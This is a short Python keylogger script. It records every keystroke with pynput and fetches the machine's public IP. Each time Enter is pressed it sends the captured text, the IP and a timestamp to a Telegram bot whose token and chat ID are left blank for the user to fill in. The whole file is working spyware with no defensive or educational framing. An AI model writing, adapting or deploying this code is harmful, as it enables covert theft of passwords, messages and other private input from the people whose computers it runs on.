from pynput import keyboard
import requests
import threading
import socket
import json
from datetime import datetime  # For timestamp

# Replace with your actual bot token and chat ID
BOT_TOKEN = ""  # Replace with your bot's token
CHAT_ID = ""  # Replace with your chat ID

# Global variables to store captured keystrokes, IP address, and timestamp
logged_sentence = ""
device_ip = None

# Function to fetch the public IP address of the device
def fetch_ip():
    global device_ip
    try:
        response = requests.get("https://api.ipify.org?format=json")
        device_ip = response.json().get("ip", "Unknown IP")
    except Exception as e:
        print(f"Failed to fetch IP address: {e}")
        device_ip = "Unknown IP"

# Function to send sentences to the Telegram bot
def send_sentence_to_telegram():
    global logged_sentence, device_ip
    if logged_sentence:
        try:
            # Get the current timestamp
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            # Prepare the message
            message = (
                f"Device IP: {device_ip}\n"
                f"Timestamp: {timestamp}\n"
                f"Captured Sentence:\n{logged_sentence}"
            )
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            payload = {"chat_id": CHAT_ID, "text": message}
            # Send the message to Telegram
            requests.post(url, data=payload)
            logged_sentence = ""  # Clear logged sentence after sending
        except Exception as e:
            print(f"Failed to send sentence: {e}")

# Function to log keystrokes
def on_press(key):
    global logged_sentence
    try:
        # Add the character of the key pressed to the sentence
        logged_sentence += str(key.char)
    except AttributeError:
        # Handle special keys (like space, enter, etc.)
        if key == keyboard.Key.space:
            logged_sentence += " "
        elif key == keyboard.Key.enter:
            send_sentence_to_telegram()  # Send the complete sentence on Enter key press
            logged_sentence = ""  # Reset the sentence
        else:
            logged_sentence += f"[{key.name}]"

# Start the keylogger
def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Fetch IP address in a separate thread
ip_thread = threading.Thread(target=fetch_ip)
ip_thread.start()

# Start the keylogger
start_keylogger()
